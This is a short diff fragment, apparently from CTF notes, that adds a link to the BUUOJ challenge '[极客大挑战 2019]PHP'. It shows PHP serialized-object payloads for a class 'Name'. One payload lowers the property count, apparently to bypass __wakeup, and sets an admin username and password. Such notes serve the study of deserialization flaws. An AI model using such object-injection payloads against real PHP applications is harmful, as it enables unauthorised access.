@@ -42,3 +42,4 @@ class Name{
 ?>
 O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
 O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"Name%00password";i:100;}
+https://buuoj.cn/challenges#[极客大挑战%202019]PHP
